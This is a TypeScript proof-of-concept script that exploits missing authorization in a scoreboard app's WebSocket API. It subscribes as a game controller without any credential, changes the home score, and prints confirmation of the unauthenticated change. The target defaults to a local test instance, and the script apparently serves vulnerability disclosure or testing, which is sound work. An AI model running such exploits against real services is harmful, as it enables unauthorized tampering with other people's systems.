type GameResponse = {
  gameId: string;
  game: {
    state: {
      score: {
        home: number;
        away: number;
      };
    };
  };
};

const baseUrl = new URL(Bun.env.TARGET_BASE_URL ?? "http://127.0.0.1:3000");
const wsUrl = new URL("/ws", baseUrl);
wsUrl.protocol = baseUrl.protocol === "https:" ? "wss:" : "ws:";

type BunWebSocketConstructor = new (
  url: string | URL,
  options: { headers: Record<string, string> },
) => WebSocket;

const BunWebSocket = WebSocket as unknown as BunWebSocketConstructor;

function waitForOpen(ws: WebSocket) {
  return new Promise<void>((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error("WebSocket open timed out")), 5_000);
    ws.addEventListener(
      "open",
      () => {
        clearTimeout(timer);
        resolve();
      },
      { once: true },
    );
    ws.addEventListener(
      "error",
      () => {
        clearTimeout(timer);
        reject(new Error("WebSocket connection failed"));
      },
      { once: true },
    );
  });
}

function waitForScore(ws: WebSocket, expectedHomeScore: number) {
  return new Promise<void>((resolve, reject) => {
    const timer = setTimeout(
      () => reject(new Error(`Did not observe home score ${expectedHomeScore}`)),
      5_000,
    );

    ws.addEventListener("message", (event) => {
      const message = JSON.parse(String(event.data)) as {
        type?: string;
        game?: {
          state?: {
            score?: {
              home?: number;
            };
          };
        };
      };

      if (
        message.type === "game-snapshot" &&
        message.game?.state?.score?.home === expectedHomeScore
      ) {
        clearTimeout(timer);
        resolve();
      }
    });
  });
}

const createResponse = await fetch(new URL("/api/games", baseUrl), {
  method: "POST",
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    homeName: "PoC Home",
    awayName: "PoC Away",
  }),
});

if (!createResponse.ok) {
  throw new Error(`Failed to create local test game: HTTP ${createResponse.status}`);
}

const created = (await createResponse.json()) as GameResponse;
const ws = new BunWebSocket(wsUrl, {
  headers: {
    origin: baseUrl.origin,
  },
});

await waitForOpen(ws);
console.log(`[+] created local game ${created.gameId}`);

ws.send(
  JSON.stringify({
    type: "subscribe-game",
    gameId: created.gameId,
    role: "controller",
  }),
);
console.log("[+] subscribed as controller without presenting a grant or credential");

ws.send(
  JSON.stringify({
    type: "apply-commands",
    gameId: created.gameId,
    commands: [
      {
        id: crypto.randomUUID(),
        clientSentAtMs: Date.now(),
        command: {
          type: "change-score",
          team: "home",
          delta: 10,
          reason: "manual",
        },
      },
    ],
  }),
);

await waitForScore(ws, 10);
ws.close();

const verifyResponse = await fetch(new URL(`/api/games/${created.gameId}`, baseUrl));
const verified = (await verifyResponse.json()) as {
  game: {
    state: {
      score: {
        home: number;
        away: number;
      };
    };
  };
};

console.log(
  `[+] unauthenticated controller command changed score to ${verified.game.state.score.home}-0`,
);
